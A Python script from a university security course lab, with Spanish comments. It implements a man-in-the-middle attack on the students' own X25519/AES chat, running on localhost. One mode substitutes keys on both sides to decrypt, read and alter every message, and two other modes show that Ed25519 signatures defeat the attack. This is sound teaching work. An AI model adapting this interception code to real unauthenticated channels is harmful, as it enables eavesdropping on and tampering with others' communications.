#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ITI-922 Seguridad de TI II
Grupo 5

Practica 2: Ataque man-in-the-middle (MITM).

El atacante se coloca entre el cliente y el servidor.
Escucha en el puerto 5001 y se conecta al servidor
en el puerto 5000. Ninguna de las dos partes lo sabe.

Modos de uso:

  python 02_ataque_mitm/atacante_mitm.py

      Ataque ACTIVO contra el protocolo SIN firmas.
      El atacante establece dos intercambios X25519
      independientes (uno con el servidor y otro con
      el cliente), deriva dos llaves AES y puede
      descifrar, leer y modificar todos los mensajes.

  python 02_ataque_mitm/atacante_mitm.py suplantacion

      El atacante sustituye las llaves X25519 en el
      protocolo CON firmas Ed25519. La transcripcion
      firmada ya no coincide y la verificacion falla:
      ambas partes rechazan la sesion.

  python 02_ataque_mitm/atacante_mitm.py relay

      Reenvio opaco de bytes (protocolo con firmas).
      La sesion autenticada funciona a traves del
      atacante, pero este solo observa bytes cifrados
      y no puede descifrarlos.
"""

import sys
import socket
import threading

from pathlib import Path

# Reutilizar los modulos de la Practica 1.
sys.path.insert(
    0,
    str(
        Path(__file__).resolve().parent.parent
        / "01_chat_cifrado"
    )
)

from criptografia import (
    generar_llaves,
    calcular_secreto,
    derivar_llave_aes,
    cifrar_mensaje,
    descifrar_mensaje
)

from comunicacion import enviar_datos, recibir_datos


HOST_ATAQUE = "127.0.0.1"
PUERTO_ATAQUE = 5001

HOST_SERVIDOR = "127.0.0.1"
PUERTO_SERVIDOR = 5000

# Si es True, el atacante altera el texto de los
# mensajes para demostrar que tambien puede escribir.
MODIFICAR_MENSAJES = True


def abrir_canal():
    """
    Abre los dos extremos del ataque:
    - Escucha en el puerto 5001 (victima).
    - Se conecta al servidor real en el puerto 5000.
    """

    # Servidor de escucha para el cliente.
    escucha = socket.socket(
        socket.AF_INET,
        socket.SOCK_STREAM
    )

    escucha.setsockopt(
        socket.SOL_SOCKET,
        socket.SO_REUSEADDR,
        1
    )

    escucha.bind((HOST_ATAQUE, PUERTO_ATAQUE))
    escucha.listen(1)

    print(
        f"[MITM] Esperando victima en "
        f"{HOST_ATAQUE}:{PUERTO_ATAQUE} ..."
    )

    conexion_cliente, direccion = escucha.accept()
    escucha.close()

    print(f"[MITM] Cliente conectado: {direccion}")

    # Conexion al servidor real.
    conexion_servidor = socket.socket(
        socket.AF_INET,
        socket.SOCK_STREAM
    )

    conexion_servidor.connect(
        (HOST_SERVIDOR, PUERTO_SERVIDOR)
    )

    print(
        f"[MITM] Conectado al servidor real "
        f"{HOST_SERVIDOR}:{PUERTO_SERVIDOR}"
    )

    return conexion_cliente, conexion_servidor


def modificar(mensaje):
    """
    Prepara la alteracion que realizara el atacante.
    La palabra 'salir' se conserva para no romper
    el cierre normal de la sesion.
    """

    if not MODIFICAR_MENSAJES:
        return mensaje

    if mensaje.lower() == "salir":
        return mensaje

    return "(modificado por MITM) " + mensaje


def ataque_lectura():
    """
    Ataque activo contra el protocolo sin firmas.
    El atacante termina el X25519 por ambos lados.
    """

    cliente, servidor = abrir_canal()

    try:

        # ==========================================
        # PASO 1: el servidor envia su llave
        # publica real. El atacante la recibe.
        # ==========================================
        publica_servidor = recibir_datos(servidor)

        print(
            "[MITM] Llave publica REAL del servidor "
            "interceptada."
        )

        # ==========================================
        # PASO 2: el atacante GENERA su propio par
        # X25519 (llave A) y se la presenta al
        # cliente como si fuera la del servidor.
        # ==========================================
        privada_a, publica_a = generar_llaves()

        enviar_datos(cliente, publica_a)

        print(
            "[MITM] Llave A enviada al cliente "
            "(suplanta al servidor)."
        )

        # ==========================================
        # PASO 3: el cliente envia su llave publica.
        # El atacante la intercepta.
        # ==========================================
        publica_cliente = recibir_datos(cliente)

        print(
            "[MITM] Llave publica del cliente "
            "interceptada."
        )

        # ==========================================
        # PASO 4: el atacante GENERA otro par
        # X25519 (llave B) y se la presenta al
        # servidor como si fuera la del cliente.
        # ==========================================
        privada_b, publica_b = generar_llaves()

        enviar_datos(servidor, publica_b)

        print(
            "[MITM] Llave B enviada al servidor "
            "(suplanta al cliente)."
        )

        # ==========================================
        # PASO 5: el servidor genera el salt.
        # No es secreto, asi que se reenvia.
        # ==========================================
        salt = recibir_datos(servidor)

        enviar_datos(cliente, salt)

        print("[MITM] Salt reenviado a ambas partes.")

        # ==========================================
        # PASO 6: el atacante calcula DOS secretos
        # distintos con una sola suplantacion.
        # ==========================================
        secreto_servidor = calcular_secreto(
            privada_b,
            publica_servidor
        )

        secreto_cliente = calcular_secreto(
            privada_a,
            publica_cliente
        )

        llave_servidor = derivar_llave_aes(
            secreto_servidor,
            salt
        )

        llave_cliente = derivar_llave_aes(
            secreto_cliente,
            salt
        )

        print("[MITM] Dos llaves AES en su poder.")
        print(
            "[MITM] El cliente y el servidor NO "
            "comparten ningun secreto entre si.\n"
        )

        # ==========================================
        # PASO 7: la confirmacion del servidor
        # viaja cifrada con llave_servidor. El
        # atacante la descifra, la lee y la
        # reentrega cifrada con llave_cliente.
        # ==========================================
        datos = recibir_datos(servidor)

        confirmacion = descifrar_mensaje(
            llave_servidor,
            datos
        )

        print(
            f"[MITM][LEIDO] Confirmacion del "
            f"servidor: {confirmacion}"
        )

        # La confirmacion se reenvia SIN alterar
        # para que el cliente continue creyendo
        # que habla directamente con el servidor.
        enviar_datos(
            cliente,
            cifrar_mensaje(
                llave_cliente,
                confirmacion
            )
        )

        # ==========================================
        # PASO 8: chat. El atacante descifra cada
        # mensaje, lo imprime y lo reenvia cifrado
        # con la llave del otro extremo.
        # ==========================================
        while True:

            # Mensaje del cliente al servidor.
            datos = recibir_datos(cliente)

            mensaje = descifrar_mensaje(
                llave_cliente,
                datos
            )

            print(
                f"\n[MITM][CLIENTE -> SERVIDOR]: "
                f"{mensaje}"
            )

            if mensaje.lower() == "salir":
                enviar_datos(
                    servidor,
                    cifrar_mensaje(
                        llave_servidor,
                        mensaje
                    )
                )
                break

            mensajeModificado = modificar(mensaje)

            if mensajeModificado != mensaje:
                print(
                    "[MITM][ALTERADO] Mensaje "
                    "reescrito antes de reenviar."
                )

            enviar_datos(
                servidor,
                cifrar_mensaje(
                    llave_servidor,
                    mensajeModificado
                )
            )

            # Respuesta del servidor al cliente.
            datos = recibir_datos(servidor)

            respuesta = descifrar_mensaje(
                llave_servidor,
                datos
            )

            print(
                f"[MITM][SERVIDOR -> CLIENTE]: "
                f"{respuesta}"
            )

            if respuesta.lower() == "salir":
                enviar_datos(
                    cliente,
                    cifrar_mensaje(
                        llave_cliente,
                        respuesta
                    )
                )
                break

            respuestaModificada = modificar(
                respuesta
            )

            if respuestaModificada != respuesta:
                print(
                    "[MITM][ALTERADO] Mensaje "
                    "reescrito antes de reenviar."
                )

            enviar_datos(
                cliente,
                cifrar_mensaje(
                    llave_cliente,
                    respuestaModificada
                )
            )

        print(
            "\n[MITM] Ataque completado: el atacante "
            "leyo y altero la conversacion completa."
        )

    except (
        ConnectionError,
        ValueError,
        OSError
    ) as error:

        print(f"[MITM][ERROR] {error}")

    finally:

        cliente.close()
        servidor.close()


def cerrar_canales(*conexiones):
    """
    Cierra los extremos indicados para
    desbloquear al hilo que quede esperando.
    """

    for conexion in conexiones:

        try:

            conexion.shutdown(socket.SHUT_RDWR)

        except OSError:

            pass


def reenviar_bloques(origen, destino, etiqueta, extremos):
    """
    Reenvia tramas completas (4 bytes de longitud
    mas contenido) sin intentar descifrarlas.
    Se usa en los modos suplantacion y relay.

    Si un extremo se cierra, se apagan los dos
    para que el otro hilo tambien termine.
    """

    while True:

        try:

            datos = recibir_datos(origen)

        except (ConnectionError, OSError):

            print(f"[MITM][{etiqueta}] Canal cerrado.")
            cerrar_canales(*extremos)
            break

        print(
            f"[MITM][{etiqueta}] "
            f"{len(datos)} bytes opacos reenviados."
        )

        print(
            f"          muestra: "
            f"{datos[:16].hex()} ..."
        )

        try:

            enviar_datos(destino, datos)

        except OSError:

            print(
                f"[MITM][{etiqueta}] "
                "No se pudo reenviar."
            )
            cerrar_canales(*extremos)
            break


def ataque_suplantacion():
    """
    Sustituye las llaves X25519 en el protocolo
    autenticado y reenvia los bloques restantes.
    La verificacion Ed25519 debe fallar.
    """

    cliente, servidor = abrir_canal()

    try:

        # Sustitucion de llaves: el atacante no
        # puede firmar la transcripcion con las
        # identidades reales, pero aun asi intenta
        # montar el intercambio.
        publica_servidor = recibir_datos(servidor)

        privada_a, publica_a = generar_llaves()
        enviar_datos(cliente, publica_a)

        publica_cliente = recibir_datos(cliente)

        privada_b, publica_b = generar_llaves()
        enviar_datos(servidor, publica_b)

        salt = recibir_datos(servidor)
        enviar_datos(cliente, salt)

        print(
            "[MITM] Llaves X25519 sustituidas en el "
            "intercambio autenticado."
        )
        print(
            "[MITM] A partir de aqui se reenvian "
            "bloques opacos y la verificacion "
            "Ed25519 debe rechazar la sesion.\n"
        )

        # Los hilos reenvian las firmas y el resto
        # de la sesion sin poder descifrarlos.
        hilo1 = threading.Thread(
            target=reenviar_bloques,
            args=(
                cliente,
                servidor,
                "cliente -> servidor",
                (cliente, servidor)
            )
        )

        hilo2 = threading.Thread(
            target=reenviar_bloques,
            args=(
                servidor,
                cliente,
                "servidor -> cliente",
                (cliente, servidor)
            )
        )

        hilo1.start()
        hilo2.start()

        hilo1.join()
        hilo2.join()

        print(
            "[MITM] Sesion terminada. La autenticacion "
            "impidio al atacante suplantar identidades."
        )

    finally:

        cerrar_canales(cliente, servidor)


def relay_opaco():
    """
    Reenvio transparente de bytes. No sustituye
    llaves: el cliente y el servidor autentican su
    intercambio a traves del atacante. El atacante
    solo ve trafico cifrado.
    """

    cliente, servidor = abrir_canal()

    print(
        "[MITM] Modo relay: no se sustituye ninguna "
        "llave, solo se reenvian los bytes.\n"
    )

    try:

        hilo1 = threading.Thread(
            target=reenviar_bloques,
            args=(
                cliente,
                servidor,
                "cliente -> servidor",
                (cliente, servidor)
            )
        )

        hilo2 = threading.Thread(
            target=reenviar_bloques,
            args=(
                servidor,
                cliente,
                "servidor -> cliente",
                (cliente, servidor)
            )
        )

        hilo1.start()
        hilo2.start()

        hilo1.join()
        hilo2.join()

        print(
            "[MITM] Sesion terminada. La sesion "
            "autenticada se completo a traves del "
            "atacante, pero el contenido nunca "
            "estuvo legible para el."
        )

    finally:

        cerrar_canales(cliente, servidor)


def main():

    modo = "lectura"

    if len(sys.argv) > 1:
        modo = sys.argv[1].lower()

    print("=== ATAQUE MAN-IN-THE-MIDDLE ===")
    print(f"[MITM] Modo: {modo}\n")

    if modo == "lectura":

        ataque_lectura()

    elif modo == "suplantacion":

        ataque_suplantacion()

    elif modo == "relay":

        relay_opaco()

    else:

        print("Modo no valido.")
        print("Opciones: lectura | suplantacion | relay")

    print("\n=== ATAQUE FINALIZADO ===")


if __name__ == "__main__":
    main()
